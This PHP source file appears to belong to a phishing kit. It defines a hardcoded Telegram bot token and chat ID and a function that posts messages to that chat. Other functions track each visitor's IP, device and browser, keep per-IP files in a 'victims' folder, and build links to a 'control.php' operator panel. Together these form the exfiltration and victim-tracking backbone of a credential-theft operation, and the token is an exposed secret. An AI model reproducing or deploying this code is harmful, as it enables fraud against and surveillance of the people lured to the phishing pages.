<?php

/*===================================================
 += Coded by: @MJ_coder
 +===================================================*/


// telegram bot informatoin 

/* Enter your Bot_Token => */ define('BOT_TOKEN', '8674511478:AAEsb89Mtibu4oE9BAEkQUGpaj6kbwyrpX8');
/* Enter your Chat_id => */
define('CHAT_ID', '-1003916894717');


function get_client_ip()
{
    // Headers to check in priority order
    $headers = [
        'HTTP_CF_CONNECTING_IP',     // Cloudflare real IP
        'HTTP_X_REAL_IP',            // Nginx real IP
        'HTTP_X_FORWARDED_FOR',      // Standard proxy forward (peut avoir plusieurs IPs)
        'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR',
    ];

    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            // X-Forwarded-For peut contenir: "real_ip, proxy1, proxy2"
            // On prend le PREMIER IP (l7a9i9i dial client)
            $ips = explode(',', $_SERVER[$header]);
            foreach ($ips as $ip) {
                $ip = trim($ip);
                // Valider que c'est un IP public (pas private/reserved)
                if (
                    filter_var(
                        $ip,
                        FILTER_VALIDATE_IP,
                        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
                    )
                ) {
                    return $ip;
                }
            }
        }
    }

    // Fallback: retourner REMOTE_ADDR meme si private
    $remote = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    return ($remote === '::1') ? '127.0.0.1' : $remote;
}


function get_steps_link()
{

    $ex = explode('/', $_SERVER['REQUEST_URI']);
    array_shift($ex);
    for ($i = 1; $i <= 3; $i++) {
        array_pop($ex);
    }
    $im = '/' . implode('/', $ex) . '/';

    $url = "http://" . $_SERVER['HTTP_HOST'] . $im;
    $x = pathinfo($url);

    return $ee = $x['dirname'] . '/control.php?ip=' . get_client_ip();

}


function reset_data()
{
    $fp = fopen('../../../victims/' . get_client_ip() . '.txt', 'wb');
    fwrite($fp, 0);
    fclose($fp);
}

function reset_data_page()
{
    $fp = fopen('./victims/' . get_client_ip() . '.txt', 'wb');
    fwrite($fp, 0);
    fclose($fp);
}

function sendTelegramMessage($botToken, $chatId, $message)
{
    // Telegram API URL
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

    // Prepare POST data
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => "html",
    ];

    // Initialize cURL session
    $ch = curl_init();

    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));

    // Execute cURL request
    $response = curl_exec($ch);

    // Check for cURL errors
    if (curl_errno($ch)) {
        echo 'cURL error: ' . curl_error($ch);
        curl_close($ch);
        return false;
    }

    // Close cURL session
    curl_close($ch);

    // Decode JSON response
    $data = json_decode($response, true);

    // Check if the message was sent successfully
    if (isset($data['ok']) && $data['ok'] === true) {
        return true;
    }

    return false;
}


function Visitors()
{
    $path = './data/visitors.json';
    $ips = json_decode(@file_get_contents($path), true);
    if (!is_array($ips))
        $ips = [];
    $ip = get_client_ip();

    if (!in_array($ip, $ips, true)) {
        $ips[] = $ip;
        file_put_contents($path, json_encode($ips, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
    }

    return count($ips);
}

function getVisitorsCount()
{
    $path = './data/visitors.json';

    $ips = json_decode(@file_get_contents($path), true);
    if (!is_array($ips))
        $ips = [];

    return count($ips);
}

function get_device_and_browser()
{
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $IP = get_client_ip();

    // Detect device
    if (preg_match('/mobile/i', $userAgent)) {
        $device = "Mobile";
    } elseif (preg_match('/tablet/i', $userAgent)) {
        $device = "Tablet";
    } else {
        $device = "Desktop";
    }

    // Detect browser
    if (preg_match('/MSIE|Trident/i', $userAgent)) {
        $browser = "Internet Explorer";
    } elseif (preg_match('/Edge/i', $userAgent)) {
        $browser = "Microsoft Edge";
    } elseif (preg_match('/Firefox/i', $userAgent)) {
        $browser = "Firefox";
    } elseif (preg_match('/Chrome/i', $userAgent)) {
        $browser = "Chrome";
    } elseif (preg_match('/Safari/i', $userAgent)) {
        $browser = "Safari";
    } elseif (preg_match('/Opera|OPR/i', $userAgent)) {
        $browser = "Opera";
    } else {
        $browser = "Unknown";
    }

    $file = "./data/user.json";
    $existing = [];

    if (file_exists($file)) {
        $json = file_get_contents($file);
        $existing = json_decode($json, true);
        if (!is_array($existing))
            $existing = [];
    }

    $existing[$IP] = [
        "device" => $device,
        "browser" => $browser,
        "user_agent" => $userAgent,
        "time" => date("Y-m-d H:i:s")
    ];

    file_put_contents($file, json_encode($existing, JSON_PRETTY_PRINT));
}

function Detectlang()
{
    return substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
}

function get_text($place)
{
    global $lang;
    return $lang[$place][$_SESSION['lang']];
}




?>
